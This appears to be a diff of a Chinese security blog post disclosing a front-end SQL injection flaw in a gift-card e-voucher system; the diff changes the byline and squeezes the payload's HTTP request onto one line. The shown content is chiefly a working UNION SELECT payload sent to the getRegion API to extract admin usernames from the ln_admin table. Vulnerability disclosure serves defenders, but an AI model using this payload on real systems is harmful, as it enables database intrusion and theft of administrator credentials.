@@ -1,5 +1,5 @@
 #  某礼品卡电子券收卡系统存在前台SQL注入漏洞   
-原创 星悦  星悦安全   2025-05-21 11:00  
+ 阿乐你好   2025-05-22 08:10  
   
 ![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
   
@@ -26,17 +26,7 @@
 Payload:  
   
 ```
-GET  /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,user_name,4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1
-Host: 127.0.0.1:8066
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://127.0.0.1:8066/
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4
-Connection: keep-alive
-
+GET  /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,user_name,4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1Host: 127.0.0.1:8066Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://127.0.0.1:8066/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4Connection: keep-alive
 ```  
   
   
